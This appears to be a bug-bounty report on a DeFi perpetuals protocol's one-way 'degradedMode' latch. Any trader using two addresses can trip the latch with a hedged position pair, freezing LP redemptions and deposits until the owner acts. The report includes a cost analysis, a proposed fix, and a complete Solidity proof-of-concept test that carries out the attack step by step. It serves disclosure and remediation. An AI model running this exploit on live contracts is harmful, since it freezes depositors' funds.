# \#97849 [SC-High] Permissionless one-way `degradedMode` latch: a hedged pair freezes LP redemptions and deposits until the owner intervenes

**Submitted on Nov 3rd 2026 at 15:02:39 UTC by @RowanDamisch for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97849
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

Any trader can latch `CfdEngine.degradedMode` on purpose with a hedged LONG + SHORT pair and a small price move (0.85–3 % in the tests). The latch is one-way: nothing re-evaluates it once the pool is solvent again, and only the owner can clear it. While it is on, LP redemptions (`settleLpEpoch`), LP deposits, new opens and traders' free-margin withdrawals all revert. In the PoC the freeze lasts 360 days with an empty book and a fully solvent pool, and it ends only through an owner action; the attacker can re-latch right after each clear. The attack costs 1/166 (empty pool) down to 1/3 554 (90 % utilization) of the frozen LP funds.

## Vulnerability Details

`CfdEngine` latches `degradedMode = true` whenever a close or a liquidation leaves pool cash below the larger side's
maximum profit (`E < L`). The latch is one-way. Nothing re-evaluates it when solvency returns, and only the owner can
clear it (`clearDegradedMode`, `onlyOwner`).

An unprivileged trader can push `E` below `L` on purpose. They fill the remaining capacity with a hedged LONG + SHORT
pair, wait for a small move (0.85–3 % in the tests), and close the winning leg. The payout leaves `E` immediately,
while the other leg keeps `L` at its maximum. The attacker then closes the second leg and withdraws everything. The book can be empty and the pool
fully solvent, yet the flag stays on.

While the flag is on:

- every `settleLpEpoch` reverts (`HousePool__DegradedMode`), so queued Junior/Senior redemptions never become
  claimable;
- new LP deposits revert (`TrancheVault__DepositsUnavailable`);
- new opens revert (`OrderRouter__DegradedMode`);
- traders with an open position cannot withdraw free margin (`CfdEngine__DegradedMode`).

In the PoC the freeze lasts 360 days (13 monthly settlement attempts, all reverted) and only ends when the owner
clears the flag. The owner does not need to inject any funds to do so, which shows that the flag is the only thing
blocking the funds. The attacker can re-latch right after each clear.

The attack costs **1/166 of the frozen LP funds on an empty pool** (raw cost, empty-pool PoC) and gets cheaper as the pool fills, down to
**1/3 554 at 90 % utilization** (friction basis; the raw cost in the 90 % PoC is 1/3 247). Every level measured is
well above the 1:100 griefing threshold.

### Root cause

```solidity
// CfdEngine.sol:1351-1369
function _enterDegradedModeIfInsolvent(address account, uint256 pendingPoolPayoutAssets) internal {
    if (degradedMode) {
        return;                      // never re-evaluated once set
    }
    uint256 effectiveAssetsAfter = _availableCashForFreshPoolPayouts();
    ...
    uint256 maxLiabilityAssets = _maxLiability();
    if (effectiveAssetsAfter < maxLiabilityAssets) {
        degradedMode = true;         // reachable by any trader's close / liquidation
        emit DegradedModeEntered(effectiveAssetsAfter, maxLiabilityAssets, account);
    }
}

// CfdEngine.sol:658-667
function clearDegradedMode() external onlyOwner {   // only exit
    ...
    if (_availableCashForFreshPoolPayouts() < _maxLiability()) revert CfdEngine__StillInsolvent();
    degradedMode = false;
}
```

- Opens are admitted while `E ≥ L + B` (settlement buffer B = 0.25 %). Closes are always allowed and call
  `_enterDegradedModeIfInsolvent` afterwards (`CfdEngine.sol:1320`, `:1344`).
- With a hedged pair `L ≈ leg size`, and the attacker's net exposure is close to zero. Closing the winning leg pays its
  profit out of `E` at once, while `L` is still held at the same level by the other leg. Once the move pays more than
  the buffer B, `E < L` and the flag latches.
- The flag is read by:
  - `HousePool._requireWithdrawalsLive` (`HousePool.sol:1864-1869`), from `settleLpEpoch` (`:832`);
  - `HousePool._entryStatusBlocked` (`HousePool.sol:1139-1144`) → `TrancheVault.requestDeposit` (`TrancheVault.sol:1594-1596`);
  - `OrderLiquidationBatchLogic._validateOpenCommitAllowed` (`:321-329`) → `commitOrder`;
  - the planner, as `OpenRevertCode.DEGRADED_MODE` (`CfdEnginePlanLib.sol:318-319`).
- Nothing on the permissionless path ever sets the flag back to `false`, even when the book is empty and
  `maxLiability == 0`.

A latch is the right reaction to a real shortfall. The bug is that a shortfall which any trader can manufacture for a
few hundred to a few thousand USDG produces a state that only the owner can leave, and leaving it does not stop the
same trader from doing it again.

## Impact Details

High, **Temporary freezing of funds for at least 24 hours**:

- **Junior/Senior LPs with queued redemptions.** Their funds cannot be withdrawn for as long as the flag is on. The
  PoC shows 360 days of reverted settlements, and the only thing that ends the freeze is an owner action.
- **New LPs** cannot deposit.
- **Honest traders with open positions** cannot withdraw free margin. Their only way out is to close the position.
- **Trading stops as well.** No new positions can be opened while the flag is on. Together with the points above, this halts the protocol's core business: no new trades, no LP deposits, no LP redemptions. One latch costs the attacker 285–6 062 USDG (table below), and the attacker can latch again right after every owner clear, so the halt lasts for as long as the attacker keeps paying that per cycle.

Feasibility, per the program rules:

- **Cost ratio** (rule *When Is An Impactful Attack Downgraded To Griefing?*): the attacker spends 1 USDG for every
  166–3 554 USDG frozen, which is above the 1:100 bar at every utilization level (table below).
- **Capital:** 85 000 USDG of margin on an empty 1M pool (empty-pool PoC). At high utilization, two to three orders of
  10 000 USDG margin are enough. No flash loan is involved (orders are commit → keeper execute) and none is needed.
- **Two addresses, not a Sybil attack:** one account cannot hold both sides (an opposite-side open is rejected with
  `MUST_CLOSE_OPPOSING`, `CfdEnginePlanLib.sol:314`), so the hedged pair needs two accounts of one actor, who pays the
  full cost; no per-identity limit or reward is gamed.
- **Holding time:** none. The attacker is fully out of the protocol before the freeze starts mattering, because the
  flag outlives every position.
- **Owner clearing is not a mitigation.** The attacker can re-latch after each clear. The main PoC re-latches right
  after an owner clear, with an honest book open. Ending the freeze takes a manual owner action; in line with the
  program's *Operating Assumptions*, no particular response time is assumed for it.

### Cost against pool utilization

The supplementary test `DegradedLatchUtilization` runs the same attack on five honest books. Each book has the
9 LONG : 6 SHORT shape, and its LONG open interest is `u` of the ~999 000 LONG capacity of a 1M Junior pool. Each
level contains:

- the attack: fill the remaining capacity, latch on the smallest up-move, close everything and withdraw;
- a check that LP settlement reverts and that the owner could clear without paying;
- a **control**: the same book and the same price move, with every honest SHORT taking profit and no attacker. The
  flag stays off.

| utilization `u` | honest LONG / SHORT OI | attacker SHORT / LONG | attacker friction (USDG) | frozen pool cash (USDG) | frozen / friction | control |
|---|---|---|---|---|---|---|
| 0 % | 0 / 0 | 599 400 / 1 000 300 | 4 183.07 | 1 010 269.96 | **241** | no latch |
| 25 % | 249 300 / 166 200 | 799 200 / 750 200 | 3 111.78 | 1 004 912.54 | 322 | no latch |
| 50 % | 499 500 / 333 000 | 299 700 / 500 600 | 1 525.65 | 1 009 082.00 | 661 | no latch |
| 75 % | 748 800 / 499 200 | 299 700 / 250 900 | 922.58 | 1 006 486.25 | 1 090 | no latch |
| 90 % | 899 100 / 599 400 | 99 900 / 100 800 | 284.99 | 1 012 979.74 | 3 554 | no latch |

- **Friction** = attacker loss + the directional P&L of the net position, `(S − L) · (p − 1)`. It is the cost of the
  attack with the luck of the price move removed. At some levels the attacker's raw result was a profit (−912.33 at
  75 %, −1 785.40 at 90 % with the alternative fill), and the table does not count that profit.
- Two fill strategies were measured per level, and the table shows the cheaper one. The true minimum cost is therefore
  at most the figure shown.
- The submitted empty-pool PoC uses a different pair (a down-move of 0.85 %) and costs 6 062.15 against 1 007 791.77
  frozen (1/166). This is the most expensive measured point, and it still clears the 1:100 bar.

## Recommended fix

Make the latch track the condition it guards, and let anyone lift it once the pool is solvent again:

```diff
 function _enterDegradedModeIfInsolvent(address account, uint256 pendingPoolPayoutAssets) internal {
     if (degradedMode) {
+        if (_availableCashForFreshPoolPayouts() >= _maxLiability()) {
+            degradedMode = false;
+            emit DegradedModeCleared();
+        }
         return;
     }
@@
-function clearDegradedMode() external onlyOwner {
+function clearDegradedMode() external {
```

The `StillInsolvent` check in `clearDegradedMode` already guards against an early clear, so the `onlyOwner` modifier
adds no protection.

Checked on a patched copy:

- the attack tests now fail at `flag outlives the attacker`, because the flag lifts on the attacker's next close
  (this includes the copy that `DegradedLatchFix` inherits, so that suite shows 2 pass / 1 fail by design);
- `test_fix_attackNoLongerFreezes` (`DegradedLatchFix.t.sol` in the gist) passes: the same attack latches, the flag is off after
  the attacker's LONG close, and bob's redemption settles at maturity with no owner action (50 483.05);
- a real shortfall still latches, and while `E < L` a stranger's `clearDegradedMode` reverts `StillInsolvent`;
- the existing suites still pass: all 29 suites / 213 tests that touch degraded mode (`DegradedSettlementBehavior`,
  `SettlementBuffer`, `PartialCloseAdmissionProperty`, the invariant handlers), and `test/perps/spec/admin/*`
  (18 suites / 233 tests).

The team may prefer a different shape. Keeping the owner path and adding the automatic clear is enough to remove the
freeze.

## References

- `_enterDegradedModeIfInsolvent`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1351-L1369
- `clearDegradedMode` (onlyOwner): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L658-L667
- close paths calling the latch: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1320 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1344
- `HousePool._requireWithdrawalsLive`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1864-L1869 (from `settleLpEpoch`, https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L832)
- `HousePool._entryStatusBlocked`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1139-L1144
- `TrancheVault.requestDeposit` check: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1594-L1596
- `OrderLiquidationBatchLogic._validateOpenCommitAllowed`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L321-L329
- planner `DEGRADED_MODE` / `MUST_CLOSE_OPPOSING`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L314-L319
- release parameters: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md


## Link to Proof of Concept

https://gist.github.com/w64267685-afk/50ed46e283e385e2fac0f708d1e90667

## Proof of Concept

## Proof of Concept

Put the three PoC files from the gist in `packages/perps/test/perps/poc/` and run them against a clean `a82d4fef` checkout. No file under `src/`
is changed. The tests build on the repository's own `HousePoolTestBase`, and only Pyth and USDG are mocked. Every trade
goes through the public `OrderRouter` (`commitOrder` → `executeOrder` by a keeper), and every impact check calls a
public, permissionless entry point.

`_release()` puts the system on the release configuration and asserts it:

- the `DEPLOYMENT.md` "Initial release parameters" table: `vpiFactor` 0.01, `maxSkewRatio` 0.4, init 20 / maint 10 /
  fad 300 bps, `baseCarryBps` 500, bounty 10 bps with a 50 % keeper share, `executionFeeBps` 4, `frozenCloseSpreadBps`
  50, `settlementBufferBps` 25, `fadRunwaySeconds` 1 h;
- the values the release-only constructor wrappers in `script/DeployPerpsArbitrumSepolia.s.sol` install, applied through
  the normal admin path: `minOpenNotionalAssets` 1 000 USDG, `adverseConfidenceMultiplierBps` 2 500, Senior capacity
  40M / 80 %. These are the same checks as that script's `_verifyInitialReleaseConfig`.

From the repository root (Foundry 1.5.1, as in the repository README):

```bash
git submodule update --init --recursive
forge test --root packages/perps --match-contract DegradedModeLatch -vv
forge test --root packages/perps --match-contract DegradedLatchUtilization -vv
```

`DegradedLatchFix.t.sol` (gist) checks the recommended fix. It runs only on a copy with `CfdEngine_fix.diff` (gist) applied
(`git apply` from the repository root, then put the file next to the PoC files and run
`forge test --root packages/perps --match-contract DegradedLatchFix -vv`). On a clean checkout leave it out. With the
fix applied that suite shows 2 pass / 1 fail by design: the inherited attack test now fails at `flag outlives the attacker`,
and `test_fix_attackNoLongerFreezes` passes.

Expected result on a clean checkout: **11 tests pass, 0 fail** (2 + 2 in the first command; 7 in the second, because
`DegradedLatchUtilization` inherits the two `DegradedModeLatchPoC` tests and adds the five `test_util_*`).

### 1. `DegradedModeLatchEmptyPoolPoC` — empty pool, attacker alone fills the capacity

Setup: Junior pool of 1 000 000 USDG (bob). Bob queues a redemption of 10 % of his shares before the attack. One
honest trader (frank) holds a 99 900 SHORT.

1. The attacker uses two addresses: dave opens a 999 000 LONG and erin opens an 899 100 SHORT, at 1.00. They fund
   85 000 USDG of margin.
2. The mark moves −0.85 % (0.9915). Dave closes the winning LONG, and `degradedMode` becomes `true`.
3. Erin closes the SHORT, and both addresses withdraw everything: 78 937.85 back, so the **attack costs 6 062.15**.
   The flag is still `true`.
4. While frank's position is open:
   - a new open by an honest trader reverts `OrderRouter__DegradedMode`;
   - frank's free-balance withdrawal reverts `CfdEngine__DegradedMode`;
   - a new LP's `requestDeposit` reverts `TrancheVault__DepositsUnavailable`.
5. Frank closes and leaves. Max liability is 0 and pool cash is 1 007 791.77, so the pool is fully solvent, and the
   flag is still `true`.
6. 13 keeper calls to `settleLpEpoch` with a fresh price, one every 30 days over 360 days, all revert
   `HousePool__DegradedMode`. Bob's `claimableRedeemRequest` stays 0.
7. The owner calls `clearDegradedMode` without paying anything. The same keeper call now settles, and bob receives
   100 570.67.

Control `test_control_noAttack_lpRedeemSettles`: frank alone opens and closes at the same price, the flag stays off,
and bob's redemption settles (100 088.87).

### 2. `DegradedModeLatchPoC` — honest book at 90 % of capacity

The honest book is 9 LONG + 6 SHORT traders, 99 900 each, with a remaining buffer of 103 348.16.

- The attacker adds a SHORT of 99 900 and a LONG of 100 800 (10 000 USDG margin per order), which leaves a buffer of
  2 550.92. Closing the SHORT at 1.030 latches the flag.
- The attacker closes the LONG and withdraws everything: 199 687.77 back for 200 000 deposited (100 000 per address,
  of which 10 000 per order is margin), so the **attack costs
  312.23** (friction 285.23), and the flag stays on. Pool cash goes from 1 002 448.16 to 1 002 679.72, and the pool
  covers the whole open book (cash − max liability = 103 579.72).
- With the honest book still open, a new open, a new LP deposit and an honest trader's free-margin withdrawal all
  revert, and `settleLpEpoch` reverts at maturity, at +24 h and at +168 h.
- The honest traders leave and the book is empty (cash 1 014 086.04). 13 settlements over 360 days all revert. The
  ratio of frozen funds to cost is **3 247** (3 555 against friction).
- The owner clears without paying, and bob receives 50 599.66.
- Trading then resumes and the honest book reopens. The attacker tops up again (SHORT 99 900 / LONG 62 300, buffer
  2 442.93) and latches at 1.029. Bob's next redemption reverts.
- Control: the same book and the same 1.030 move without the attacker, with all 6 honest SHORTs taking profit. No
  latch, and bob's redemption settles.

### 3. `DegradedLatchUtilization` — the cost curve above

`test_util_00`, `test_util_25`, `test_util_50`, `test_util_75` and `test_util_90` each run the attack (with both fill
strategies) and the control at one utilization level. All 5 pass.

### Test code: `DegradedModeLatchEmptyPool.t.sol`

The other two PoC files and the fix are in the gist.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {HousePoolTestBase} from "../shared/HousePoolTestBase.sol";
import {console2} from "forge-std/console2.sol";

/// Permissionless one-way `degradedMode` latch, worst case for the attacker: empty pool, the attacker alone fills the capacity.
/// Any trader can latch `degradedMode` with a cheap hedged pair; the latch is one-way (only the owner clears it)
/// and blocks every LP epoch settlement, so queued Junior redemptions and new LP deposits stay frozen indefinitely,
/// even after the attacker has left and the pool is fully solvent (empty book, max liability 0).
///
/// Release configuration (DEPLOYMENT.md "Initial release parameters" and the release-only constructor wrappers in
/// script/DeployPerpsArbitrumSepolia.s.sol), asserted in `_release`.
/// Every trade goes through the public OrderRouter (commitOrder -> executeOrder with a mocked Pyth update);
/// every impact check calls a public, permissionless entry point. Only Pyth and USDG are mocked.
contract DegradedModeLatchEmptyPoolPoC is HousePoolTestBase {

    address internal dave = address(0x444); // attacker, LONG leg
    address internal erin = address(0x555); // attacker, SHORT leg (same person, second address)
    address internal frank = address(0x666); // honest trader, SHORT
    address internal gina = address(0x777); // honest trader who wants to open after the latch
    address internal keeper = address(0xBEEF); // permissionless executor

    uint256 internal constant CHUNK = 99_900 * 1e18;
    uint256 internal constant LATCH_PRICE = 0.9915e8; // 0.85 % move from the 1.00 entry

    // ---------------- setup ----------------

    function _release() internal {
        _setRiskParams(
            CfdTypes.RiskParams({
                vpiFactor: 0.01e18,
                maxSkewRatio: 0.4e18,
                maintMarginBps: 10,
                initMarginBps: 20,
                fadMarginBps: 300,
                baseCarryBps: 500,
                minBountyAssets: 1e6,
                bountyBps: 10,
                keeperShareBps: 5000,
                protocolShareBps: 0
            })
        );
        assertEq(engine.executionFeeBps(), 4, "release execution fee 0.04 %");
        // release-only constructor wrappers (script/DeployPerpsArbitrumSepolia.s.sol): Router opening minimum, oracle
        // adverse-confidence multiplier, finite Senior capacity. Applied through the normal admin path.
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.minOpenNotionalAssets = 1000e6;
        rc.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(rc);
        _setSeniorCapacity(40_000_000e6, 8000);
        // same checks as the deploy script's _verifyInitialReleaseConfig, plus the engine release table
        assertEq(router.minOpenNotionalAssets(), 1000e6);
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500);
        assertEq(router.pletherOracle().basketMaxConfidenceRatioBps(), 10);
        assertEq(router.maxPendingOrders(), 5);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(engine.frozenCloseSpreadBps(), 50);
        assertEq(engine.settlementBufferBps(), 25);
        assertEq(engine.fadRunwaySeconds(), 1 hours);
        _fundJunior(bob, 1_000_000 * 1e6);
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _live();
    }

    function _live() internal {
        while (engine.isOracleFrozen()) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
        }
    }

    // ---------------- public-path helpers ----------------

    /// Trader commits through OrderRouter, keeper executes with a fresh Pyth update at `price`.
    function _route(
        address a,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory r) {
        OrderV3Types.OrderRequest memory q;
        q.clientOrderId = keccak256(abi.encode("n4", router.nextCommitId()));
        q.side = side;
        q.sizeDelta = size;
        q.marginDelta = margin;
        q.isClose = isClose;
        // widest slippage bound (OrderValidationLib.checkSlippage)
        bool upper = isClose ? side == CfdTypes.Side.LONG : side == CfdTypes.Side.SHORT;
        q.targetPrice = upper ? type(uint256).max : 1;
        q.bounds.submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        q.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        q.bounds.allowedExecutionModes = 7;
        q.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        q.bounds.maxExecutionBountyAssets = type(uint256).max;
        q.bounds.maxExecutionNotionalAssets = type(uint256).max;
        q.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        q.bounds.maxActionChargeAssets = type(uint256).max;
        q.bounds.maxExplicitFeesAssets = type(uint256).max;
        q.bounds.maxPostPositionSize = type(uint256).max;
        q.bounds.maxPostLeverageBps = type(uint32).max;
        vm.prank(a);
        uint64 id = router.commitOrder(q);
        bytes[] memory upd = _mockPythUpdateData(price);
        vm.prank(keeper);
        r = router.executeOrder(id, upd);
    }

    function _trade(
        address a,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        OrderV3Types.ExecutionResult memory r = _route(a, side, size, margin, isClose, price);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function commitExt(
        address a,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price
    ) external returns (uint8 status) {
        require(msg.sender == address(this));
        status = uint8(_route(a, side, size, margin, false, price).status);
    }

    function withdrawExt(
        address a,
        uint256 amt
    ) external {
        require(msg.sender == address(this));
        vm.prank(a);
        clearinghouse.withdraw(a, amt);
    }

    function depositExt(
        address a,
        uint256 amt
    ) external {
        require(msg.sender == address(this));
        settlementToken.mint(a, amt);
        vm.startPrank(a);
        settlementToken.approve(address(juniorVault), amt);
        juniorVault.requestDeposit(amt, a, a);
        vm.stopPrank();
    }

    /// Permissionless keeper call that processes the LP queue, with a fresh Pyth update.
    function _settle(
        uint256 p
    ) internal returns (bool ok, bytes4 sel) {
        bytes[] memory upd = _mockPythUpdateData(p);
        vm.prank(keeper);
        try router.settleLpEpoch(upd) {
            ok = true;
        } catch (bytes memory err) {
            sel = bytes4(err);
        }
    }

    function _ownerCanClear() internal returns (bool ok) {
        uint256 s = vm.snapshotState();
        vm.prank(engine.owner());
        try engine.clearDegradedMode() {
            ok = true;
        } catch {}
        vm.revertToState(s);
    }

    function _size(
        address a
    ) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(a);
    }

    function _cash() internal view returns (uint256) {
        return pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
    }

    function _maxLiab() internal view returns (uint256) {
        return engineProtocolLens.getProtocolAccountingSnapshot().maxLiabilityAssets;
    }

    function _toMaturity(
        uint256 rid
    ) internal {
        if (vm.getBlockTimestamp() < pool.lpEpochStart(rid) + 20) vm.warp(pool.lpEpochStart(rid) + 20);
        _live();
    }

    function _exitAll(
        address a
    ) internal returns (uint256 got) {
        uint256 w = settlementToken.balanceOf(a);
        uint256 bal = clearinghouse.balanceAssets(a);
        vm.prank(a);
        clearinghouse.withdraw(a, bal);
        got = settlementToken.balanceOf(a) - w;
    }

    // ---------------- control: same honest state, no attacker ----------------

    function test_control_noAttack_lpRedeemSettles() public {
        _release();
        _fundTrader(frank, 12_000 * 1e6);
        _finishAsyncCooldown(juniorVault, bob);
        uint256 rid = _requestAsyncRedeem(juniorVault, bob, juniorVault.balanceOf(bob) / 10);

        _trade(frank, CfdTypes.Side.SHORT, CHUNK, 6_000 * 1e6, false, 1e8);
        vm.warp(vm.getBlockTimestamp() + 10 minutes);
        _live();
        _trade(frank, CfdTypes.Side.SHORT, CHUNK, 0, true, LATCH_PRICE);
        assertFalse(engine.degradedMode(), "honest close at the same price does not latch");

        _toMaturity(rid);
        (bool ok,) = _settle(LATCH_PRICE);
        assertTrue(ok, "control: LP epoch settles");
        (, uint256 got) = _claimAsyncRedeem(juniorVault, rid, bob);
        console2.log("CONTROL (no attack): degraded", engine.degradedMode());
        console2.log("CONTROL (no attack): bob redeem settled, receives (6 dec)", got);
        assertGt(got, 0);
    }

    // ---------------- attack ----------------

    function test_attack_latchFreezesLpFunds() public {
        _release();
        uint256 atkFunded = 85_000 * 1e6;
        _fundTrader(dave, 10_000 * 1e6);
        _fundTrader(erin, 75_000 * 1e6);
        _fundTrader(frank, 12_000 * 1e6);
        _fundTrader(gina, 20_000 * 1e6);

        // honest LP queues a 10 % Junior redemption before the attack
        _finishAsyncCooldown(juniorVault, bob);
        uint256 rid = _requestAsyncRedeem(juniorVault, bob, juniorVault.balanceOf(bob) / 10);
        console2.log("bob (honest LP) Junior deposit 1,000,000 USDG; queued redeem request id", rid);

        // 1. attacker opens a hedged pair at 1.00: dave LONG 999k, erin SHORT 899k; frank (honest) SHORT 99.9k
        for (uint256 i = 0; i < 10; i++) {
            _trade(dave, CfdTypes.Side.LONG, CHUNK, 500 * 1e6, false, 1e8);
            if (i < 9) _trade(erin, CfdTypes.Side.SHORT, CHUNK, 5_000 * 1e6, false, 1e8);
            else _trade(frank, CfdTypes.Side.SHORT, CHUNK, 6_000 * 1e6, false, 1e8);
        }
        assertFalse(engine.degradedMode(), "not degraded before the attack");
        console2.log("1. book: dave LONG / erin SHORT / frank SHORT (tokens)", _size(dave) / 1e18, _size(erin) / 1e18, _size(frank) / 1e18);

        // 2. a 0.85 % move; attacker closes the winning LONG leg -> engine latches degradedMode
        vm.warp(vm.getBlockTimestamp() + 10 minutes);
        _live();
        _trade(dave, CfdTypes.Side.LONG, _size(dave), 0, true, LATCH_PRICE);
        assertTrue(engine.degradedMode(), "latched by an unprivileged trader");
        console2.log("2. attacker closed LONG leg at 0.9915 -> degradedMode", engine.degradedMode());

        // 3. attacker closes the SHORT leg and withdraws everything: attacker is completely out
        _trade(erin, CfdTypes.Side.SHORT, _size(erin), 0, true, LATCH_PRICE);
        uint256 atkBack = _exitAll(dave) + _exitAll(erin);
        assertEq(_size(dave) + _size(erin), 0);
        console2.log("3. attacker funded / withdrew to wallet (6 dec)", atkFunded, atkBack);
        console2.log("   attacker net cost (6 dec)", int256(atkFunded) - int256(atkBack));
        console2.log("   degradedMode after attacker left", engine.degradedMode());
        assertTrue(engine.degradedMode(), "flag outlives the attacker");

        // 4. collateral impact on honest users while frank still holds a position
        uint256 s4 = vm.snapshotState();
        try this.commitExt(gina, CfdTypes.Side.SHORT, CHUNK, 5_000 * 1e6, LATCH_PRICE) returns (uint8 st) {
            console2.log("4a. new open by honest trader, lifecycle status (2=Executed)", st);
            assertTrue(st != uint8(OrderV3Types.LifecycleStatus.Executed), "new open must not execute");
            assertEq(_size(gina), 0);
        } catch (bytes memory err) {
            assertEq(bytes4(err), IOrderRouterErrors.OrderRouter__DegradedMode.selector);
            console2.log("4a. new open by honest trader: commitOrder reverts OrderRouter__DegradedMode");
        }
        vm.revertToState(s4);
        try this.withdrawExt(frank, 1_000 * 1e6) {
            revert("frank free-balance withdraw should be blocked");
        } catch (bytes memory err) {
            assertEq(bytes4(err), ICfdEngineTypes.CfdEngine__DegradedMode.selector);
            console2.log("4b. honest trader with open position: withdraw of free balance reverts CfdEngine__DegradedMode");
        }
        s4 = vm.snapshotState();
        try this.depositExt(carol, 100_000 * 1e6) {
            revert("new LP deposit should be blocked");
        } catch (bytes memory err) {
            assertEq(bytes4(err), TrancheVault.TrancheVault__DepositsUnavailable.selector);
            console2.log("4c. new LP: requestDeposit reverts TrancheVault__DepositsUnavailable");
        }
        vm.revertToState(s4);

        // 5. frank leaves too: book empty, pool fully solvent, flag still on
        vm.warp(vm.getBlockTimestamp() + 1 minutes);
        _live();
        _trade(frank, CfdTypes.Side.SHORT, _size(frank), 0, true, LATCH_PRICE);
        console2.log("5. frank closed and withdrew (6 dec)", _exitAll(frank));
        assertEq(_maxLiab(), 0, "no open interest");
        console2.log("   max liability / pool cash (6 dec)", _maxLiab(), _cash());
        console2.log("   degradedMode with empty book and solvent pool", engine.degradedMode());
        assertTrue(engine.degradedMode());

        // 6. no owner action: every permissionless LP settlement fails for 360 days
        _toMaturity(rid);
        uint256 t0 = vm.getBlockTimestamp();
        uint256 failed;
        for (uint256 m = 0; m <= 12; m++) {
            vm.warp(t0 + m * 30 days);
            _live();
            (bool ok, bytes4 sel) = _settle(1e8);
            if (!ok) {
                assertEq(sel, IHousePool.HousePool__DegradedMode.selector);
                failed++;
            }
            console2.log("6. day / LP settle ok / degraded", (vm.getBlockTimestamp() - t0) / 1 days, ok, engine.degradedMode());
        }
        assertEq(failed, 13, "LP queue blocked at every monthly attempt over 360 days");
        assertEq(juniorVault.claimableRedeemRequest(rid, bob), 0, "bob's redeem never becomes claimable");
        console2.log("   bob claimable after 360 days", juniorVault.claimableRedeemRequest(rid, bob));
        console2.log("   owner could clear at any point (cash >= liability)", _ownerCanClear());

        // 7. only the trusted owner can restore: clear with no payment, then the same keeper call works
        vm.prank(engine.owner());
        engine.clearDegradedMode();
        (bool okC,) = _settle(1e8);
        assertTrue(okC, "settles once the owner clears");
        (, uint256 got) = _claimAsyncRedeem(juniorVault, rid, bob);
        console2.log("7. owner cleared (no recapitalization), bob finally receives (6 dec)", got);
        assertGt(got, 0);
    }

}
```

